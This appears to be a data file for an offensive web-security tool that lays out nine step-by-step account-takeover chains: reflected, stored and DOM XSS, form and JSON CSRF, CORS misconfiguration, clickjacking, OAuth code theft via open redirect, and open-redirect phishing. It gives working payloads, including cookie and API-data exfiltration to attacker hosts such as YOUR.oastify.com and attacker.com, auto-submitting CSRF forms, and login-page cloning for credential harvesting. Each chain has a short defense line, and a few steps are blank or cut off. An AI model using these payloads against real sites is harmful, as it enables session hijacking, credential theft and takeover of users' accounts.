chains.title: A link to someone else's session: Reflected XSS → cookie theft → ATO
chains.impact: Full session hijack of anyone who opens the link; reflected XSS pays out, escalated to ATO via cookie theft.
chains.why: The canonical 'one link = their account' scenario and the fastest jump from reflection to real impact.
chains.precondition: An unsanitized parameter is reflected into an HTML/JS response AND the session cookie is issued without the HttpOnly flag.
chains.realWorld: PortSwigger 'Exploiting cross-site scripting to steal cookies'; general technique.
chains.defense: HttpOnly on the session cookie kills theft via document.cookie; encode output and enable CSP script-src 'self'.

steps.title: Find a reflected parameter
steps.detail: inject a unique canary ?q=ars3nal_canary7331 and grep the raw response for the un-encoded marker

steps.title: Confirm JS execution
steps.detail: HTML context: "><svg onload=alert(document.domain)>  |  attribute break: " autofocus onfocus=alert(document.domain) x="

steps.title: Check the HttpOnly flag
steps.detail: curl -sI https://target/ | grep -i set-cookie; if HttpOnly is absent on session=, document.cookie theft works

steps.title: Replace alert() with exfiltration
steps.detail: "><script>new Image().src='https://YOUR.oastify.com/c?'+encodeURIComponent(document.cookie)</script>
steps.success: the victim's session cookie arrives at your Collaborator

steps.title: Deliver the link and catch the cookie
steps.detail: URL-encode the payload into the vulnerable param and send to the victim; watch Burp Collaborator / webhook.site

steps.title: Replay the stolen cookie
steps.detail: paste session=... into the Cookie header (or browser), refresh, you are now logged in as the victim

steps.title: Lock the victim out → ATO
steps.detail: from the hijacked session change email then password to finish the takeover

chains.title: Riding the session: Stored XSS → HttpOnly bypass → ATO
chains.impact: ATO even with an HttpOnly cookie and CSRF tokens; the stored payload hits everyone who opens the page.
chains.why: Shows that HttpOnly is not a wall: the session rides along with any same-origin fetch your JS makes.
chains.precondition: Stored input is rendered to other users (profile name, comment, ticket), the session cookie is HttpOnly, and the sensitive action is protected by a CSRF token taken from the DOM or an endpoint.
chains.realWorld: 'How We Turned a Medium XSS into a High Bounty by Bypassing HttpOnly Cookie' (Sec-88); HackerOne #123900.
chains.defense: CSP + the framework's auto-escaping stop the injection; double-submit tokens are useless when JS runs same-origin, so the only fix is eliminating the XSS.

steps.title: Inject a stored payload
steps.detail: <script src=//attacker.com/p.js></script> stored in a profile/comment field; it runs when an admin views the page

steps.title: Confirm the cookie is inaccessible
steps.detail: curl -sI shows HttpOnly on session=, so document.cookie is empty; pivot to riding the session via same-origin fetch

steps.title: Read the CSRF token same-origin
steps.detail: fetch('/account',{credentials:'include'}).then(r=>r.text()).then(t=>token=t.match(/name="csrf" value="([^"]+)"/)[1])

steps.title: Change state as the victim
steps.detail: fetch('/account/email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+token+'&email={EMAIL}'})

steps.title: (Alt.) Exfiltrate sensitive DOM
steps.detail: fetch('/api/me').then(r=>r.text()).then(d=>new Image().src='https://YOUR.oastify.com/?'+btoa(d))  // lift API keys / PII

steps.title: Seize the recovery channel → ATO
steps.detail: trigger password reset to the attacker email you just set for full ATO

chains.title: Fragment ghost: DOM XSS via a location/hash sink → ATO
chains.impact: Client-side XSS triggered from the #fragment (never sent to the server, invisible to the WAF and logs) leading to session/token theft and ATO; rampant in modern SPAs.
chains.why: The bug lives entirely in JavaScript, so server-side filters and the WAF never see it; you have to look in the client.
chains.precondition: Client-side JS reads a source (location.hash, location.search, document.referrer, postMessage) and passes it into a sink (innerHTML, document.write, eval, jQuery $(), location=).
chains.realWorld: PortSwigger 'DOM-based cross-site scripting' labs; general technique.
chains.defense: Use safe sinks (textContent, setAttribute), enable Trusted Types; the fragment bypasses server-side controls, so reviewing the client-side JS is mandatory.

steps.title: Map sources to sinks
steps.detail: in DevTools search the bundle for location.hash / innerHTML / eval / document.write, or run Burp DOM Invader and watch the canary flow

steps.title: Confirm the sink fires
steps.detail: innerHTML sink: target/# | href/location sink: target/#javascript:alert(document.domain)
steps.success: alert fired from the #fragment = DOM XSS

steps.title: Account for framework quirks
steps.detail: jQuery $(location.hash) takes #; Angular/legacy templates may need a known CSTI/sandbox-escape gadget

steps.title: Weaponize into token theft
steps.detail: #

steps.title: Deliver the link with the fragment
steps.detail: everything after # never reaches the server, so no WAF or log entry; send the URL straight to the victim

steps.title: Replay the stolen JWT/cookie → ATO
steps.detail: set the bearer token or cookie, hit /api/me, take over the account

chains.title: Silent email swap: form CSRF → ATO (SameSite and method gaps)
chains.impact: Email takeover with no interaction → password reset → full ATO from a single visit; classic CSRF-to-ATO.
chains.why: CSRF bread and butter: if 'change email' has no valid token, a single auto-submitting page takes the account.
chains.precondition: An email/password change endpoint, the session cookie travels cross-site (SameSite=None, no SameSite on non-Chrome browsers, the 2-minute Lax+POST window, or a GET endpoint), and there is no valid anti-CSRF token.
chains.realWorld: PortSwigger CSRF labs (token not tied to session / duplicated in cookie / SameSite Lax bypass via method override); general technique.
chains.defense: A per-session, server-validated CSRF token plus SameSite=Lax/Strict, and re-prompting for the current password on email/password change.

steps.title: Intercept the email-change request
steps.detail: in Burp submit the real form, note method, params and any csrf token

steps.title: Check whether the token is real
steps.detail: remove the csrf param, then blank it, then swap in another user's token; if the change still succeeds the token is decorative

steps.title: Examine the cookie and SameSite
steps.detail: curl -sI target reads Set-Cookie: no SameSite or SameSite=None means cross-site POST works; default Lax means force a fresh login then fire within the 2-minute Lax+POST window

steps.title: Build the auto-submit PoC
steps.detail: <form action="https://target/account/email" method="POST"><input name="email" value="{EMAIL}"></form><script>document.forms[0].submit()</script>
steps.success: the account email changed without the victim's involvement

steps.title: (GET variant) one-liner
steps.detail: (Lax sends the cookie on a top-level GET navigation; an tag would NOT)

steps.title: (Method-override variant)
steps.detail: if POST-only but it honors _method=POST or X-HTTP-Method-Override, smuggle it through a Lax-friendly top-level GET nav

steps.title: Send the page, then reset → ATO
steps.detail: victim opens it, email flips, run forgot-password for full ATO

chains.title: JSON that isn't safe: JSON CSRF via Content-Type → ATO
chains.impact: CSRF against a 'JSON-only, CORS-protected' API that everyone assumes is invulnerable → account takeover.
chains.why: Kills the myth that a JSON API can't be CSRF'd: the text/plain trick skips the CORS preflight entirely.
chains.precondition: The endpoint parses a JSON body but doesn't strictly require Content-Type: application/json (it also accepts text/plain), uses cookie authentication, and has no CSRF token.
chains.realWorld: PentesterLab 'JSON CSRF'; HackTricks CSRF (text/plain bypass); the Fastify content-type CVE class.
chains.defense: Require Content-Type: application/json server-side AND add a CSRF token or a custom header like X-Requested-With that forces a preflight.

steps.title: Confirm lax content-type parsing
steps.detail: replay the JSON request changing Content-Type: application/json to text/plain; if it still updates, it is exploitable

steps.title: Understand why there is no preflight
steps.detail: text/plain is a CORS simple content type, so the browser sends it cross-site with cookies and no OPTIONS preflight

steps.title: Build the form smuggle (text/plain)
steps.detail: <form action="https://target/api/account" method="POST" enctype="text/plain"><input name='{"email":"{EMAIL}","x":"' value='"}'></form>  (body assembles to valid JSON with a throwaway key)

steps.title: (fetch variant)
steps.detail: fetch('https://target/api/account',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'{"email":"{EMAIL}"}'})

steps.title: Auto-submit and delivery
steps.detail: <script>document.forms[0].submit()</script> hosted on attacker.com, link sent to the victim

steps.title: Reset to the new email → ATO
steps.detail: forgot-password to {EMAIL} for full ATO

chains.title: Cross-origin leak: CORS misconfig → exfiltration of authenticated data → ATO
chains.impact: Reading the victim's authenticated responses cross-origin (API keys, PII, tokens) from any page they open → often ATO.
chains.why: A single overly generous Access-Control-Allow-Origin turns 'their logged-in data' into 'yours' with no XSS at all.
chains.precondition: A sensitive authenticated endpoint returns Access-Control-Allow-Credentials: true and either reflects the attacker's Origin, accepts null, or trusts an attacker-controlled subdomain.
chains.realWorld: PortSwigger 'CORS vulnerability with basic origin reflection' and 'trusted null origin' labs.
chains.defense: Never reflect Origin or allow null together with Allow-Credentials: true; use a strict server-side allowlist of exact origins.

steps.title: Spot the header
steps.detail: replay an authed request adding Origin: https://evil.com; check the response for Access-Control-Allow-Origin: https://evil.com plus Allow-Credentials: true

steps.title: Classify the flaw
steps.detail: arbitrary reflected Origin / null accepted / trusts *.target.com (take over a sub) / regex bug like target.com.evil.com

steps.title: Build the reflected-origin PoC
steps.detail: fetch('https://api.target/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://YOUR.oastify.com/?'+encodeURIComponent(d)))
steps.success: the /accountDetails response with the API key arrives at Collaborator

steps.title: (null-origin variant)
steps.detail: host the PoC in <iframe sandbox="allow-scripts" srcdoc="<script>...</script>"> so the request carries Origin: null and gets reflected

steps.title: Host over HTTPS and deliver
steps.detail: victim visits your page while logged in; their API key or PII lands on Collaborator

steps.title: Use the stolen key/token → ATO
steps.detail: authenticate with the exfiltrated API key or session token for ATO

chains.title: One hidden click: clickjacking → state change → ATO
chains.impact: Make a logged-in victim perform a sensitive action with one hidden click (email change, adding the attacker as admin, OAuth consent) → ATO; impact-dependent, often.
chains.why: The cheapest PoC: pure HTML with no script bug, when a sensitive page can be framed and the action survives a cross-site frame.
chains.precondition: The sensitive page can be framed (no X-Frame-Options, no CSP frame-ancestors), the action is GET- or top-level-form-friendly, and the session cookie travels inside the frame (SameSite=None or a first-party flow).
chains.realWorld: PortSwigger Clickjacking labs (change email; frame-buster bypass); 'DoubleClickjacking' (2025).
chains.defense: Serve X-Frame-Options: DENY or CSP frame-ancestors 'none'; SameSite=Lax/Strict on the session cookie blunts framed authenticated actions.

steps.title: Check framability
steps.detail: curl -sI https://target/account | grep -iE 'x-frame-options|content-security-policy'; if absent and <iframe src=https://target/account> renders, it is clickjackable

steps.title: Locate the target control
steps.detail: find the on-screen position of the Change email / Confirm button inside the framed page

steps.title: Pre-fill the value
steps.detail: if the field accepts a query param, frame https://target/account?email={EMAIL} so only one click is needed

steps.title: Build the transparent overlay
steps.detail: Click to win

steps.title: Align the decoy with the real button
steps.detail: tweak top/left until Click to win sits exactly over Confirm; allow-forms neutralizes frame-buster scripts

steps.title: (DoubleClickjacking variant)
steps.detail: for SPA confirm dialogs that resist framing, use the 2025 double-click timing trick

steps.title: Deliver and convert → ATO
steps.detail: victim clicks, email changes, password reset, ATO

chains.title: Borrowed login: open redirect → OAuth code/token theft → ATO
chains.impact: Stealing the victim's authorization code or access token, then logging in as them without a password → full ATO; one of the most profitable chains, often.
chains.why: A 'low' open redirect on an OAuth client becomes a critical ATO once it's wired into the consent flow.
chains.precondition: The target uses OAuth/SSO and the provider's redirect_uri validation is weak (allows subpaths or subdomains) OR there is an open redirect on an allowed redirect host that bounces the code to you.
chains.realWorld: HackerOne #1861974 (pixiv redirect_uri path traversal), #665651 (GSA OAuth token); PortSwigger 'Stealing OAuth access tokens via an open redirect'.
chains.defense: Exact-match allowlist for redirect_uri (no wildcards or subpaths), enforce PKCE and a single-use state, bind the code to the exact redirect.

steps.title: Intercept the OAuth request
steps.detail: record /authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&state=...

steps.title: Probe the redirect_uri validation
steps.detail: try target.com.evil.com, target.com@evil.com, /callback/../redirect?url=evil.com, path traversal, an extra subdomain

steps.title: Find an open redirect on an allowed host
steps.detail: https://target/login?next=https://evil.com  or  /redirect?url=//evil.com  (confirm a 30x to attacker)

steps.title: Chain the provider and the redirect
steps.detail: set redirect_uri to the allowed host's open redirect so the provider hands the code to a trusted URL that 302s to evil.com, leaking code in the query (and the prior code in Referer; token in the # fragment for implicit flow)

steps.title: Build the trap
steps.detail: page at evil.com logs: new Image().src='https://YOUR.oastify.com/?'+encodeURIComponent(location.href+'|'+document.referrer)
steps.success: the victim's authorization code arrives at your listener

steps.title: Deliver the authorize link
steps.detail: send the crafted /authorize?... link; the victim, already logged into the provider, is bounced and the code lands on you

steps.title: Exchange the code → session → ATO
steps.detail: POST the stolen code to /token (or replay the callback URL) to mint the victim's session

chains.title: Bait on a trusted domain: open redirect → credential phishing → ATO
chains.impact: Credential theft via a link that genuinely starts on the target's trusted domain and leads to a pixel-perfect fake login → ATO; on its own, but a high success rate in the real world.
chains.why: Teaches you to weaponize a 'boring' open redirect for social engineering and why reviewers shouldn't dismiss it.
chains.precondition: An open redirect on the target's trusted domain via a parameter like ?returnUrl=, ?next=, ?url=, ?redirect=.
chains.realWorld: 'Open Redirect to OAuth/credential ATO' (Bug Bounty Playbook); general technique.
chains.defense: Allowlist redirect targets to relative paths only, show an interstitial when leaving for an external site, and don't reflect the raw user URL into Location.

steps.title: Find the redirect parameter
steps.detail: fuzz ?next= ?url= ?returnUrl= ?dest= with https://evil.com and //evil.com; confirm a 30x or JS location= to attacker

steps.title: Bypass weak filters
steps.detail: //evil.com, https:evil.com, https://target.com.evil.com, https://evil.com%23.target.com, /%2f/evil.com, whitelisted-prefix tricks

steps.title: Confirm it leaves the origin
steps.detail: the browser actually lands on evil.com starting from a target.com/... link (the trust anchor the victim sees)

steps.title: Stand up the login clone
steps.detail: clone the real login page (wget -mk or the SingleFile extension) and point the form action to your collector

steps.title: Add realism after login
steps.detail: after capturing creds, redirect back to the real site logged-out so it reads as a harmless glitch

steps.title: Deliver the link and collect → ATO
steps.detail: send https://target.com/login?next=https://evil.com/login; the victim's username and password POST to your server, then log in as them
